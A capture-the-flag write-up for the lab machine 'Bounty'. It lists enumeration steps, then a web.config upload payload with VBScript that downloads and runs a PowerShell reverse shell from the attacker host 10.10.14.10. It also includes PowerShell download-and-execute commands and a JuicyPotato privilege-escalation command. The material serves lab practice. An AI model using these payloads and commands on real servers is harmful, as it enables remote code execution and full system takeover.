**Ping**
![[Pasted image 20240626002341.png]]

**Nmap Scans**
```
mapit 10.10.10.93
```

Nmap Default Scan
![[Pasted image 20240626002533.png]]

Nmap Service and Script Scan
![[Pasted image 20240626002627.png]]

Nmap All Port Scan


On Port 80
![[Pasted image 20240626004027.png]]

Gobuster Scan
![[Pasted image 20240626005227.png]]
there is some file transfer.aspx, will check that

On http://10.10.10.93/transfer.aspx
![[Pasted image 20240626004147.png]]
We have an upload functionality

We can upload image files, but couldn't upload any other format
![[Pasted image 20240626005105.png]]
![[Pasted image 20240626005117.png]]

Will try to access the image we have uploaded in /uploadedfiles directory
http://10.10.10.93/uploadedfiles/SecSignal.jpg
![[Pasted image 20240626011455.png]]

But we can't upload malicious jpg file using Image magic trick



But we can upload .config file, will upload .config file with the reverse shell payload
```
<?xml version="1.0" encoding="UTF-8"?> <configuration> <system.webServer> <handlers accessPolicy="Read, Script, Write"> <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" /> </handlers> <security> <requestFiltering> <fileExtensions> <remove fileExtension=".config" /> </fileExtensions> <hiddenSegments> <remove segment="web.config" /> </hiddenSegments> </requestFiltering> </security> </system.webServer> </configuration> <%@ Language=VBScript %> <% call Server.CreateObject("WSCRIPT.SHELL").Run("cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.10/rev.ps1')") %>
```
![[Pasted image 20240626011653.png]]

Will access that file to trigger the reverse shell
![[Pasted image 20240626011735.png]]

![[Pasted image 20240626011752.png]]

Got reverse Shell
![[Pasted image 20240626011828.png]]

The file are hidden, so...
```
gci -force
```
![[Pasted image 20240626012335.png]]

User.txt
![[Pasted image 20240626012425.png]]


Will jump to Privilege Escalation.....!

Our Privileges
```
whoami /priv
```
![[Pasted image 20240626020812.png]]

System info
```
systeminfo
```
![[Pasted image 20240626020900.png]]

Will run the Sherlock.ps1
```
iex(new-object net.webclient).downloadstring('http://10.10.14.10/Sherlock.ps1')
```
```
Find-AllVulns
```
![[Pasted image 20240626021715.png]]
![[Pasted image 20240626021730.png]]
![[Pasted image 20240626021745.png]]

Will first try Impersonate privilege and the OS version and is looks likely vulnerable, So will use Juicy Potato.

Will transfer the JuciyPotato and our .bat file to the target machine
```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10/JuicyPotato.exe', 'C:\windows\temp\jucy.exe')
```
```
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.10/rev.bat', 'C:\windows\temp\rev.bat')
```

CLSID:https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise/

Now will run the exploit
```
./jucy.exe -l 443 -p C:\windows\temp\rev.bat -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```
![[Pasted image 20240626021321.png]]

We got Reverse shell
![[Pasted image 20240626021343.png]]

Root.txt
![[Pasted image 20240626021424.png]]



Done With Bounty.....:)
